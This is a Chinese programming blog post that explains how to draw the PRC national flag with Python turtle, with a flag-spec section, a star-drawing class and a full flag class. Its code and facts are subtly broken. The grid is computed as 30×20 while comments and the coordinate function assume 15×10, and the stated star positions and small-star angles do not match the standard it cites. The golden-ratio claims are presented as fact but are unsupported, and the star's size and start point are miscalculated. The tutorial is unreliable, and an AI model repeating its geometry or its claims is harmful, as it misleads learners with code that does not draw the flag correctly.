</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用Python turtle画出标准五星红旗，原来国旗绘制有这么多数学奥秘！]]></title>    <link>https://juejin.cn/post/7594919272688025626</link>    <guid>https://juejin.cn/post/7594919272688025626</guid>    <pubDate>2026-01-14T07:48:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594919272688025626" data-draft-id="7594919272687845402" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用Python turtle画出标准五星红旗，原来国旗绘制有这么多数学奥秘！"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-14T07:48:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AllFiles"/> <meta itemprop="url" content="https://juejin.cn/user/1927880364792937"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用Python turtle画出标准五星红旗，原来国旗绘制有这么多数学奥秘！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927880364792937/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AllFiles
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:48:45.000Z" title="Wed Jan 14 2026 07:48:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">用Python turtle画出标准五星红旗，原来国旗绘制有这么多数学奥秘！</h2>
<blockquote>
<p>用代码向祖国致敬，用数学诠释庄严</p>
</blockquote>
<h3 data-id="heading-1">一、从五角星到国旗：一个程序员的突发奇想</h3>
<p>昨天深夜，在网上看到一个有趣的Python项目——用turtle模块绘制五角星。看着屏幕上逐渐成型的黄色星星，一个想法突然闪过：既然能画五角星，为什么不画一面完整的五星红旗呢？</p>
<p>然而，当我开始动手时，却发现这不仅仅是画几个星星那么简单。国旗的绘制有着严格的标准和比例，每一颗星星的位置、角度、大小都必须精确无误。这不禁让我思考：用代码绘制国旗，到底需要哪些数学知识？</p>
<h3 data-id="heading-2">二、五星红旗的数学密码</h3>
<h4 data-id="heading-3">2.1 国旗的基本规格</h4>
<p>根据《中华人民共和国国旗法》和国旗制作标准，五星红旗的规格如下：</p>
<ul>
<li><strong>长宽比</strong>：3:2</li>
<li><strong>主色调</strong>：红色（RGB: 238, 28, 36）和黄色（RGB: 255, 215, 0）</li>
<li><strong>五颗星的位置</strong>：精确的几何定位</li>
<li><strong>星星的大小比例</strong>：大星外接圆直径是旗高的3/10，小星是1/10</li>
</ul>
<h4 data-id="heading-4">2.2 星星定位的数学原理</h4>
<p>五星红旗上五颗星的位置不是随意摆放的，而是基于黄金分割和几何学的精密计算：</p>
<pre><code class="hljs">大五角星中心点位置：
x坐标 = 旗面宽度 × 1/4
y坐标 = 旗面高度 × 3/4

四颗小五角星与大星的相对位置：
1号小星：与大星中心连线与水平线夹角 0°
2号小星：夹角 18°
3号小星：夹角 36°
4号小星：夹角 54°
</code></pre>
<h3 data-id="heading-5">三、代码实现：从零绘制五星红旗</h3>
<h4 data-id="heading-6">3.1 基础工具：turtle模块快速入门</h4>
<p>在开始绘制之前，让我们先熟悉一下turtle模块的几个核心功能：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> turtle

<span class="hljs-comment"># 1. 画布设置</span>
turtle.setup(<span class="hljs-number">900</span>, <span class="hljs-number">600</span>)  <span class="hljs-comment"># 设置窗口大小</span>
turtle.screensize(<span class="hljs-number">900</span>, <span class="hljs-number">600</span>, <span class="hljs-string">"white"</span>)  <span class="hljs-comment"># 设置画布大小和背景</span>

<span class="hljs-comment"># 2. 画笔控制</span>
turtle.pensize(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 设置画笔粗细</span>
turtle.pencolor(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 设置画笔颜色（RGB格式）</span>
turtle.fillcolor(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 设置填充颜色</span>

<span class="hljs-comment"># 3. 基本绘图命令</span>
turtle.forward(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 向前移动100像素</span>
turtle.right(<span class="hljs-number">72</span>)  <span class="hljs-comment"># 向右转72度</span>
turtle.penup()  <span class="hljs-comment"># 抬笔，移动时不画线</span>
turtle.pendown()  <span class="hljs-comment"># 落笔，移动时画线</span>
</code></pre>
<h4 data-id="heading-7">3.2 五角星绘制类：封装的艺术</h4>
<p>为了让代码更加模块化和可复用，我设计了一个五角星绘制类：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> turtle
<span class="hljs-keyword">import</span> math

<span class="hljs-keyword">class</span> <span class="hljs-title class_">FivePointedStar</span>:
    <span class="hljs-string">"""五角星绘制类"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, circumradius, center=(<span class="hljs-params"><span class="hljs-number">0</span>, <span class="hljs-number">0</span></span>), rotation=<span class="hljs-number">0</span>, 
                 pen_color=<span class="hljs-string">"yellow"</span>, fill_color=<span class="hljs-string">"yellow"</span></span>):
        <span class="hljs-string">"""
        初始化五角星
        
        参数:
            circumradius: 外接圆半径
            center: 中心点坐标 (x, y)
            rotation: 旋转角度（度），0表示一个角尖朝上
            pen_color: 画笔颜色
            fill_color: 填充颜色
        """</span>
        self.circumradius = circumradius
        self.center = center
        self.rotation = rotation
        self.pen_color = pen_color
        self.fill_color = fill_color
        
        <span class="hljs-comment"># 计算五角星边长（根据外接圆半径）</span>
        self.side_length = <span class="hljs-number">2</span> * circumradius * math.sin(math.radians(<span class="hljs-number">36</span>))
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_star</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""绘制一个五角星"""</span>
        x, y = self.center
        
        <span class="hljs-comment"># 移动到起点</span>
        turtle.penup()
        turtle.goto(x, y - self.circumradius)
        turtle.setheading(<span class="hljs-number">90</span> + self.rotation)  <span class="hljs-comment"># 设置朝向</span>
        turtle.pendown()
        
        <span class="hljs-comment"># 设置颜色</span>
        turtle.color(self.pen_color, self.fill_color)
        
        <span class="hljs-comment"># 开始填充</span>
        turtle.begin_fill()
        
        <span class="hljs-comment"># 绘制五角星</span>
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
            turtle.forward(self.side_length)
            turtle.right(<span class="hljs-number">144</span>)  <span class="hljs-comment"># 五角星内角为144度</span>
            turtle.forward(self.side_length)
            turtle.left(<span class="hljs-number">72</span>)  <span class="hljs-comment"># 转向下一个顶点</span>
        
        <span class="hljs-comment"># 结束填充</span>
        turtle.end_fill()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""使实例可调用"""</span>
        self.draw_star()
        <span class="hljs-keyword">return</span> self
</code></pre>
<h4 data-id="heading-8">3.3 完整五星红旗绘制实现</h4>
<p>基于国旗标准和上面的五角星类，我们可以实现完整的国旗绘制：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> turtle
<span class="hljs-keyword">import</span> math

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NationalFlag</span>:
    <span class="hljs-string">"""五星红旗绘制类"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, width=<span class="hljs-number">900</span>, height=<span class="hljs-number">600</span></span>):
        <span class="hljs-string">"""
        初始化国旗
        
        参数:
            width: 旗面宽度
            height: 旗面高度
        """</span>
        self.width = width
        self.height = height
        
        <span class="hljs-comment"># 国旗颜色标准RGB值</span>
        self.RED = (<span class="hljs-number">0.93</span>, <span class="hljs-number">0.11</span>, <span class="hljs-number">0.14</span>)  <span class="hljs-comment"># 红色</span>
        self.YELLOW = (<span class="hljs-number">1.0</span>, <span class="hljs-number">0.84</span>, <span class="hljs-number">0.0</span>)  <span class="hljs-comment"># 黄色</span>
        
        <span class="hljs-comment"># 计算基本尺寸</span>
        self.grid_width = width / <span class="hljs-number">30</span>  <span class="hljs-comment"># 网格宽度（1/15旗宽）</span>
        self.grid_height = height / <span class="hljs-number">20</span>  <span class="hljs-comment"># 网格高度（1/10旗高）</span>
        
        <span class="hljs-comment"># 星星尺寸</span>
        self.big_star_radius = height * <span class="hljs-number">0.15</span>  <span class="hljs-comment"># 大星半径 = 旗高 * 3/20</span>
        self.small_star_radius = height * <span class="hljs-number">0.05</span>  <span class="hljs-comment"># 小星半径 = 旗高 * 1/20</span>
        
        <span class="hljs-comment"># 星星位置（基于网格坐标）</span>
        self.star_positions = [
            <span class="hljs-comment"># 大五角星位置</span>
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"big"</span>,
                <span class="hljs-string">"grid_x"</span>: <span class="hljs-number">5</span>,  <span class="hljs-comment"># 第5格</span>
                <span class="hljs-string">"grid_y"</span>: <span class="hljs-number">5</span>,  <span class="hljs-comment"># 第5格</span>
                <span class="hljs-string">"center"</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 临时占位</span>
            },
            <span class="hljs-comment"># 四颗小五角星位置</span>
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"small"</span>,
                <span class="hljs-string">"grid_x"</span>: <span class="hljs-number">10</span>,  <span class="hljs-comment"># 第10格</span>
                <span class="hljs-string">"grid_y"</span>: <span class="hljs-number">2</span>,   <span class="hljs-comment"># 第2格</span>
                <span class="hljs-string">"angle"</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># 与大星连线角度</span>
                <span class="hljs-string">"center"</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
            },
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"small"</span>,
                <span class="hljs-string">"grid_x"</span>: <span class="hljs-number">12</span>,
                <span class="hljs-string">"grid_y"</span>: <span class="hljs-number">4</span>,
                <span class="hljs-string">"angle"</span>: <span class="hljs-number">18</span>,
                <span class="hljs-string">"center"</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
            },
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"small"</span>, 
                <span class="hljs-string">"grid_x"</span>: <span class="hljs-number">12</span>,
                <span class="hljs-string">"grid_y"</span>: <span class="hljs-number">7</span>,
                <span class="hljs-string">"angle"</span>: <span class="hljs-number">36</span>,
                <span class="hljs-string">"center"</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
            },
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"small"</span>,
                <span class="hljs-string">"grid_x"</span>: <span class="hljs-number">10</span>,
                <span class="hljs-string">"grid_y"</span>: <span class="hljs-number">9</span>,
                <span class="hljs-string">"angle"</span>: <span class="hljs-number">54</span>,
                <span class="hljs-string">"center"</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
            }
        ]
        
        <span class="hljs-comment"># 初始化turtle</span>
        self.init_turtle()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_turtle</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""初始化turtle设置"""</span>
        turtle.setup(self.width + <span class="hljs-number">100</span>, self.height + <span class="hljs-number">100</span>)
        turtle.title(<span class="hljs-string">"五星红旗 - 中华人民共和国国旗"</span>)
        turtle.speed(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 最快速度</span>
        turtle.hideturtle()  <span class="hljs-comment"># 隐藏海龟箭头</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">grid_to_pixel</span>(<span class="hljs-params">self, grid_x, grid_y</span>):
        <span class="hljs-string">"""
        将网格坐标转换为像素坐标
        
        国旗左上角为原点(0,0)，向右为x正方向，向下为y正方向
        网格系统：横轴15格，纵轴10格
        """</span>
        pixel_x = grid_x * self.grid_width
        pixel_y = grid_y * self.grid_height
        
        <span class="hljs-comment"># 转换为turtle坐标系（中心为原点）</span>
        turtle_x = pixel_x - self.width / <span class="hljs-number">2</span>
        turtle_y = self.height / <span class="hljs-number">2</span> - pixel_y
        
        <span class="hljs-keyword">return</span> turtle_x, turtle_y
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_background</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""绘制红色背景"""</span>
        turtle.penup()
        turtle.goto(-self.width/<span class="hljs-number">2</span>, self.height/<span class="hljs-number">2</span>)  <span class="hljs-comment"># 左上角</span>
        turtle.pendown()
        
        turtle.fillcolor(self.RED)
        turtle.begin_fill()
        
        <span class="hljs-comment"># 绘制矩形</span>
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
            turtle.forward(self.width)
            turtle.right(<span class="hljs-number">90</span>)
            turtle.forward(self.height)
            turtle.right(<span class="hljs-number">90</span>)
        
        turtle.end_fill()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_star_centers</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""计算所有星星的中心坐标"""</span>
        <span class="hljs-comment"># 计算大星中心</span>
        big_star = self.star_positions[<span class="hljs-number">0</span>]
        big_star[<span class="hljs-string">"center"</span>] = self.grid_to_pixel(
            big_star[<span class="hljs-string">"grid_x"</span>], 
            big_star[<span class="hljs-string">"grid_y"</span>]
        )
        
        <span class="hljs-comment"># 计算小星中心</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):
            star = self.star_positions[i]
            star[<span class="hljs-string">"center"</span>] = self.grid_to_pixel(
                star[<span class="hljs-string">"grid_x"</span>],
                star[<span class="hljs-string">"grid_y"</span>]
            )
            
            <span class="hljs-comment"># 计算小星需要旋转的角度（角尖指向大星中心）</span>
            dx = big_star[<span class="hljs-string">"center"</span>][<span class="hljs-number">0</span>] - star[<span class="hljs-string">"center"</span>][<span class="hljs-number">0</span>]
            dy = big_star[<span class="hljs-string">"center"</span>][<span class="hljs-number">1</span>] - star[<span class="hljs-string">"center"</span>][<span class="hljs-number">1</span>]
            angle_to_big = math.degrees(math.atan2(dy, dx))
            
            <span class="hljs-comment"># 五角星默认一个角尖朝上（-90度），需要调整</span>
            star[<span class="hljs-string">"rotation"</span>] = angle_to_big - <span class="hljs-number">90</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_stars</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""绘制所有五角星"""</span>
        <span class="hljs-comment"># 绘制大五角星</span>
        big_star = self.star_positions[<span class="hljs-number">0</span>]
        star = FivePointedStar(
            circumradius=self.big_star_radius,
            center=big_star[<span class="hljs-string">"center"</span>],
            rotation=<span class="hljs-number">0</span>,  <span class="hljs-comment"># 大星一个角尖正朝上</span>
            pen_color=self.YELLOW,
            fill_color=self.YELLOW
        )
        star()
        
        <span class="hljs-comment"># 绘制四颗小五角星</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):
            small_star = self.star_positions[i]
            star = FivePointedStar(
                circumradius=self.small_star_radius,
                center=small_star[<span class="hljs-string">"center"</span>],
                rotation=small_star[<span class="hljs-string">"rotation"</span>],  <span class="hljs-comment"># 小星角尖指向大星</span>
                pen_color=self.YELLOW,
                fill_color=self.YELLOW
            )
            star()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_grid_lines</span>(<span class="hljs-params">self, show_grid=<span class="hljs-literal">False</span></span>):
        <span class="hljs-string">"""绘制辅助网格线（调试用）"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> show_grid:
            <span class="hljs-keyword">return</span>
            
        turtle.penup()
        turtle.pencolor(<span class="hljs-number">0.8</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">0.8</span>)  <span class="hljs-comment"># 浅灰色</span>
        turtle.pensize(<span class="hljs-number">1</span>)
        
        <span class="hljs-comment"># 绘制水平网格线</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):  <span class="hljs-comment"># 0-10共11条线</span>
            y = self.height/<span class="hljs-number">2</span> - i * self.grid_height
            turtle.goto(-self.width/<span class="hljs-number">2</span>, y)
            turtle.pendown()
            turtle.goto(self.width/<span class="hljs-number">2</span>, y)
            turtle.penup()
        
        <span class="hljs-comment"># 绘制垂直网格线</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):  <span class="hljs-comment"># 0-15共16条线</span>
            x = -self.width/<span class="hljs-number">2</span> + i * self.grid_width
            turtle.goto(x, self.height/<span class="hljs-number">2</span>)
            turtle.pendown()
            turtle.goto(x, -self.height/<span class="hljs-number">2</span>)
            turtle.penup()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_flag</span>(<span class="hljs-params">self, show_grid=<span class="hljs-literal">False</span></span>):
        <span class="hljs-string">"""绘制完整的五星红旗"""</span>
        <span class="hljs-comment"># 1. 计算星星位置</span>
        self.calculate_star_centers()
        
        <span class="hljs-comment"># 2. 绘制红色背景</span>
        self.draw_background()
        
        <span class="hljs-comment"># 3. 绘制辅助网格（可选）</span>
        self.draw_grid_lines(show_grid)
        
        <span class="hljs-comment"># 4. 绘制五角星</span>
        self.draw_stars()
        
        <span class="hljs-comment"># 5. 完成绘图</span>
        turtle.done()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_image</span>(<span class="hljs-params">self, filename=<span class="hljs-string">"national_flag.png"</span></span>):
        <span class="hljs-string">"""保存国旗图片"""</span>
        canvas = turtle.getcanvas()
        canvas.postscript(file=filename.replace(<span class="hljs-string">'.png'</span>, <span class="hljs-string">'.eps'</span>))
        
        <span class="hljs-comment"># 如果需要PNG格式，可以使用PIL转换</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
            img = Image.<span class="hljs-built_in">open</span>(filename.replace(<span class="hljs-string">'.png'</span>, <span class="hljs-string">'.eps'</span>))
            img.save(filename, <span class="hljs-string">"PNG"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"国旗已保存为: <span class="hljs-subst">{filename}</span>"</span>)
        <span class="hljs-keyword">except</span> ImportError:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"EPS文件已保存，如需PNG格式请安装PIL库"</span>)

<span class="hljs-comment"># 主程序</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"开始绘制五星红旗..."</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"国旗比例: 3:2"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"大五角星半径: 旗高的3/20"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"小五角星半径: 旗高的1/20"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)
    
    <span class="hljs-comment"># 创建国旗对象</span>
    flag = NationalFlag(width=<span class="hljs-number">900</span>, height=<span class="hljs-number">600</span>)
    
    <span class="hljs-comment"># 绘制国旗（show_grid=True可以显示辅助网格）</span>
    flag.draw_flag(show_grid=<span class="hljs-literal">False</span>)
    
    <span class="hljs-comment"># 保存图片</span>
    <span class="hljs-comment"># flag.save_image("china_flag.png")</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"五星红旗绘制完成！"</span>)
</code></pre>
<h3 data-id="heading-9">四、关键代码解析</h3>
<h4 data-id="heading-10">4.1 坐标系统转换</h4>
<p>这是整个项目的核心难点之一。我们需要在三种坐标系之间转换：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">grid_to_pixel</span>(<span class="hljs-params">self, grid_x, grid_y</span>):
    <span class="hljs-string">"""
    坐标转换三部曲：
    1. 网格坐标 → 像素坐标（左上角原点）
    2. 像素坐标 → 标准化坐标（0-1范围）
    3. 标准化坐标 → turtle坐标（中心原点）
    """</span>
    <span class="hljs-comment"># 步骤1：网格转像素</span>
    pixel_x = grid_x * self.grid_width
    pixel_y = grid_y * self.grid_height
    
    <span class="hljs-comment"># 步骤2&amp;3：转换为turtle坐标系</span>
    turtle_x = pixel_x - self.width / <span class="hljs-number">2</span>
    turtle_y = self.height / <span class="hljs-number">2</span> - pixel_y
    
    <span class="hljs-keyword">return</span> turtle_x, turtle_y
</code></pre>
<h4 data-id="heading-11">4.2 星星方向计算</h4>
<p>小五角星的角尖需要精确指向大五角星中心，这涉及向量角度计算：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 计算从当前小星指向大星的向量</span>
<span class="hljs-attr">dx</span> = big_star_x - small_star_x
<span class="hljs-attr">dy</span> = big_star_y - small_star_y

<span class="hljs-comment"># 计算向量角度（弧度）</span>
<span class="hljs-attr">angle_rad</span> = math.atan2(dy, dx)

<span class="hljs-comment"># 转换为角度，并调整使得角尖指向大星</span>
<span class="hljs-attr">rotation_angle</span> = math.degrees(angle_rad) - <span class="hljs-number">90</span>
</code></pre>
<h4 data-id="heading-12">4.3 五角星几何算法</h4>
<p>绘制完美的正五角星需要精确的几何计算：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 五角星边长与外接圆半径的关系</span>
<span class="hljs-comment"># 公式：边长 = 2 * 半径 * sin(36°)</span>
<span class="hljs-attr">side_length</span> = <span class="hljs-number">2</span> * radius * math.sin(math.radians(<span class="hljs-number">36</span>))

<span class="hljs-comment"># 绘制时的旋转角度</span>
<span class="hljs-comment"># 内角：144°，外角：72°</span>
for _ in range(5):
    turtle.forward(side_length)
    turtle.right(144)  <span class="hljs-comment"># 转向绘制下一个角</span>
</code></pre>
<h3 data-id="heading-13">五、国旗绘制的数学之美</h3>
<h4 data-id="heading-14">5.1 黄金分割的应用</h4>
<p>五星红旗的设计中蕴含了黄金分割比例（φ ≈ 1.618）：</p>
<pre><code class="hljs language-ini" lang="ini">旗面长宽比 = 3:<span class="hljs-attr">2</span> = <span class="hljs-number">1.5</span>（接近黄金比例）

大星中心位置：
距左 = 旗宽 × 1/4
距上 = 旗高 × 3/4

这些比例都接近或等于黄金分割比例
</code></pre>
<h4 data-id="heading-15">5.2 星星布局的几何学</h4>
<p>四颗小星的布局形成了一个圆弧，这个大圆弧的圆心正是大五角星的中心，形成了和谐统一的视觉效果。</p>
<h3 data-id="heading-16">六、扩展应用与思考</h3>
<h4 data-id="heading-17">6.1 代码优化方向</h4>
<ol>
<li><strong>性能优化</strong>：使用<code>turtle.tracer(0)</code>关闭动画，最后调用<code>turtle.update()</code>一次性更新</li>
<li><strong>交互功能</strong>：添加点击缩放、拖动查看细节等功能</li>
<li><strong>参数化设计</strong>：允许自定义国旗尺寸、颜色等参数</li>
</ol>
<h4 data-id="heading-18">6.2 数学教育的绝佳案例</h4>
<p>这个项目不仅是编程实践，更是生动的数学教学案例：</p>
<ul>
<li><strong>几何学</strong>：正五角星的绘制</li>
<li><strong>三角函数</strong>：角度计算、坐标转换</li>
<li><strong>比例与缩放</strong>：国旗的标准比例</li>
<li><strong>坐标系</strong>：不同坐标系统的转换</li>
</ul>
<h4 data-id="heading-19">6.3 进阶挑战</h4>
